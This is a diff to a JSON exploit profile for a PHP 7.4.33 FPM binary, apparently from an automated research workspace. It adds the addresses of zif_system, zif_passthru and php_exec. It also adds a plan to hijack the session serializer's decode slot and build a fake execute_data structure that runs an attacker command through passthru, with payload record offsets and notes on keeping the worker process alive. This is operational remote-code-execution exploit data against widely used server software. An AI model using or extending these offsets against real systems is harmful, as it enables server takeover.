@@ -2,7 +2,7 @@
   "name": "g2-fpm-7433-minfpm",
   "lane": "fpm",
   "stage": "G2",
-  "status": "offsets derived from the built non PIE FPM binary; G2 not run live",
+  "status": "offsets derived from the built non PIE FPM binary; G2/G6 not run live",
   "php_version": "7.4.33",
   "binary": "/tmp/opencode/research/veroff_20261021_215718/build/php-7.4.33/sapi/fpm/php-fpm",
   "build_id": "1f996193caece78f0f794fb83c3c60707a068ce1",
@@ -13,6 +13,44 @@
   "align16": true,
   "image_base": "0x400000",
   "serializer": "php_binary",
+  "zif_system": "0x71dd66",
+  "zif_passthru": "0x71dd76",
+  "php_exec_ex": "0x71daf7",
+  "php_exec": "0x71d7fc",
+  "zif_route": {
+    "decode_slot": "ps_serializers[2].decode",
+    "symbol_verification": "nm -an and readelf -sW; zif_passthru = zif_system + 0x10 on this binary",
+    "zif_system": {
+      "address": "0x71dd66",
+      "php_exec_type": 1,
+      "behavior": "one-shot: command executes, then php_exec writes the return zval through return_value=ZSTR_LEN(data); SIGSEGV at php_exec+450"
+    },
+    "zif_passthru": {
+      "address": "0x71dd76",
+      "php_exec_type": 3,
+      "behavior": "clean: type 3 never writes return_value; HTTP 200 and worker survives in the lab"
+    },
+    "fake_execute_data": {
+      "base": "ZSTR_VAL(data) = X2 + 0x18",
+      "num_args_off": "0x2c",
+      "num_args": 1,
+      "arg1_value_off": "0x50",
+      "arg1_type_off": "0x58",
+      "arg1_type": 6,
+      "zend_string_len_off": "0x10",
+      "zend_string_val_off": "0x18",
+      "func_read": false,
+      "arg_info_read": false
+    },
+    "record": {
+      "key1_len": 96,
+      "f_payload_off": "0x100",
+      "cmd_len_off": "0x110",
+      "cmd_off": "0x118",
+      "negative_k": "(ps_serializers[2].decode - (B0 + 0x10)) / 16",
+      "note": "X1 for P/B0, X2 for F; the command is NUL-free and F+0x10 is its strlen"
+    }
+  },
   "md5_lock": "select this profile only when the target binary md5 matches; a mismatch invalidates every offset",
   "structs": {
     "ps_serializer_size": 24,
